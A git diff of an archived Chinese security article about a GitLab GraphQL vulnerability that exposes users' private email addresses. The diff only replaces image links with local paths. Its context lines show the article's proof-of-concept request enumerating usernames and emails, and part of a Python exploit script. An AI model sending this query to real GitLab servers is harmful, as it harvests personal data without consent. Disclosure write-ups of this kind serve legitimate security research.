@@ -42,7 +42,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/us6cQKy_h8aR1b2zUAzh_w)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)
+![](../../.resource/remote/565dff06de2c0571aa8634353d3ee48f34e22060ed81ae34dbacca97a9237278.gif)
 
 **一****：漏洞描述🐑**
 
@@ -56,13 +56,13 @@ GitLab 中存在 Graphql 接口 输入构造的数据时会泄露用户邮箱和
 
 **转 CNVD 的时候发现一个 Github 半公开的信息泄露漏洞**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtN7NPiceSMZRC3C3LRBa6rXceHQAKw7cr3FJpevqibnjVwu42Pn4iaW39tw/640?wx_fmt=png)
+![](../../.resource/remote/73542f497e8c82118fe3dd9558474b028a5ff9c3262a1ef8e6a9662054a66160.png)
 
 在 Hackone 中看到了有关的报告和修复方法
 
 地址: https://gitlab.com/gitlab-org/gitlab/-/issues/244275  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtNXAxrD1ibjG6VKFF2G547zibQsuJrJflTekpbVhcPuzD8Gp3QTkbtkthg/640?wx_fmt=png)
+![](../../.resource/remote/d91b671f1fe48c0990cf06fec25f83f5a3f4d4f0b01ffa19670bf892ce5f93fa.png)
 
 **这里报告的意思为调用 Graphql 的查询方法来返回用户的邮箱，而 GitLab 的用户邮箱并不是公开的**
 
@@ -72,7 +72,7 @@ GitLab 中存在 Graphql 接口 输入构造的数据时会泄露用户邮箱和
 
 **接口地址为:** **http://xxx.xxx.xxx.xxx/-//graphql-explorer**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtNibOgWwOicO3f7aIcibCF0GaUUzN5lia5cOgLB7wic6lZicEfGM8Bdh9ZstTQ/640?wx_fmt=png)
+![](../../.resource/remote/2b24a8ce93df842508046a0d0736244f7784a34c8e54219e3ad2ebed7969856c.png)
 
 **这里使用报告中的查询方法来获取用户邮箱，而这里的前提却是需要已知的用户名**
 
@@ -82,7 +82,7 @@ GitLab 中存在 Graphql 接口 输入构造的数据时会泄露用户邮箱和
 
 **https://graphql.cn/**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtNBsDzXoTTIf23PKOk5F2uPAzokLDPQHUSrOHmjtKuBye3z8IjBI1pyQ/640?wx_fmt=png)
+![](../../.resource/remote/a2c7c011e08bb38a86fe7a63f61e5192504a5c97ab7667251594503d52f84ba5.png)
 
 **请求 POC 为**
 
@@ -114,7 +114,7 @@ Content-Type: application/json
 {"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtNAJDFdhXXyELJiczAibN3CHJ9HLcF9eZUCP62NgUpC0appowMzJrnxDDQ/640?wx_fmt=png)
+![](../../.resource/remote/582321a62988939d03d568ea416475d3b3feb08424f8a8b094828cb0cd264980.png)
 
 成功返回数据，造成 Gitlab 的用户邮箱信息泄露  
 
@@ -173,7 +173,7 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtNgy9whWZoVuXt8zfsjlvjLaBWpiaLiaUEkdOj6iaTq64KrDib9wvAXjca0Q/640?wx_fmt=png)
+![](../../.resource/remote/58c3c77187ea0d11bdfd80a9a988ab997a5e849c6a666c55d954d45cf618cb65.png)
 
  ****五:  Goby & POC🦉****
 
@@ -183,7 +183,7 @@ EXP放在 Goby & POC 目录中可一键导入Goby扫描
 阅读原文 ----> Github ----> Goby & POC 目录
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oF2l5ktS9dTWiaYTocYmtNDHfVn6pGmZib42ZTNicHUYH7icz8FG6TxwHyciafYjgz1h1kw6kUMpHTAg/640?wx_fmt=png)
+![](../../.resource/remote/ca10d460d25c9e6a3998bc22eb688db0e84838b35d8f3df3ff3c91934d161286.png)
 
 最后
 --
@@ -192,7 +192,7 @@ EXP放在 Goby & POC 目录中可一键导入Goby扫描
 > 
 > 别忘了 Github 下载完给个小星星⭐
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)
+![](../../.resource/remote/db24e7036c6033b3096cc6bcf3daa42f7778b91d944c595acd55b7a1b0302046.png)
 
 ---
 
